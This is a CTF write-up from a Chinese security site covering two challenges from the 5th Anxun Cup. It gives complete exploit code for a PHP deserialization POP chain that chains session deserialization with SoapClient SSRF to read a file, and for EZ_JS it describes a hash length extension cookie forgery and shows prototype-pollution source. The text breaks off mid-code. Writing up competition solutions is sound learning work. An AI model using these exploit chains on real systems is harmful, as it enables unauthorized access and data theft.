---
title: 第五届安洵杯 WriteUp by Mini-Venom
url: https://www.secpulse.com/archives/192546.html
source: 安全脉搏
date: 2022-11-30
fetch_date: 2025-10-04T00:03:39.400160
---

# 第五届安洵杯 WriteUp by Mini-Venom

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 第五届安洵杯 WriteUp by Mini-Venom

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[ChaMd5安全团队](https://www.secpulse.com/newpage/author?author_id=3747)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-29

15,123

## Web

### babyphp

解题思路
题目给了源代码：

```
// index.php
<?php
//something in flag.php

class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C
{
    public $a;
    public $c;

    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            $tmp = array(reset($_SESSION), $this->a);
            call_user_func($tmp);
        }
    }
}

if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);

//flag.php
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="63127.0.0.1"){
    $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
    echo "only localhost!!";
}
```

看到flag.php基本可以确定是SSRF了，既然是php的SSRF而且还有反序列化，一下子锁定SoapClient这个类。

index.php的反序列化链很好找，调用栈大概是这样子：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709370.png)

中间需要绕过两个判断，第一个是：

```
if (isset($this->a) && $this->a == md5($this->a))
```

找一个md5运算前后开头都是0e的值就行了，比如0e215962017。 第二个绕过是A类的\_\_wakeup函数，这个控制序列化后属性和原来的数量不同即可。

```
$ser_str = str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str);
```

但是这样还是不能拿到flag，题目里面还有这么一段代码：

```
if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
```

既然session可控，而且还给了ini\_set函数，那就想到php的session反序列化，配合SoapClient类打一个SSRF，访问flag.php 那首先写一个ssrf.php

```
<?php
$target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
    'uri' => "http://127.0.0.1/"));
$a = serialize($b);
echo "|".urlencode($a);
```

将反序列化的值保存到sess文件里：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-16697093701.png)

然后改变php反序列化引擎为php\_serialize，以便触发session反序列化

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709373.png)

使用原本的pop链触发session反序列化

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709376.png)

最后输出session的值

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709377.png)

下面是全部的代码

```
//exp.php
<?php
class A
{
    public $a;
    public $b;
    function __construct(){
        $this->a = "0e215962017";
        $this->b = new C(1);
    }

}
class B
{
    public $a;
    public $b;
    public $k;
    function __construct(){
        $this->a=new C(new A());
    }
}
class C
{
    public $a;
    public $c;
    function __construct($class){
        $this->a = "SoapClient";
        $this->c = $class;
    }
}
$exp = new B();
$ser_str = serialize($exp);
$ser_str = str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str);
echo $ser_str;

// ssrf.php
<?php
$target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
    'uri' => "http://127.0.0.1/"));
$a = serialize($b);
echo "|".urlencode($a);
```

## EZ\_JS

解题思路

页面提示：

```
<!--This secret is 7 characters long for security!
hash=md5(secret+"flag");//1946714cfa9deb70cc40bab32872f98a
admin cookie is   md5(secret+urldecode("flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog"));
-->
```

联想到哈希拓展长度攻击

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709380.png)

然后登录

```
POST /index HTTP/1.1
Host: 47.108.29.107:23333
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://47.108.29.107:23333
Connection: close
Referer: http://47.108.29.107:23333/
Cookie: hash=ed63246fb602056fee4a7ec886d0a3c2
Upgrade-Insecure-Requests: 1

pwd=123&userid=Admin
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192546-1669709381.png)

登录成功后提示infoflllllag 页面，访问后得到源代码：

```
var express = require('express');
var router = express.Router();
const isObject = obj = >obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) = >{
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

const clone = (a) = >{
    return merge({},
    a);
}
router.get('/',
function(req, res, next) {
    if (req.flag == "flag") {
        flag;
        res.send...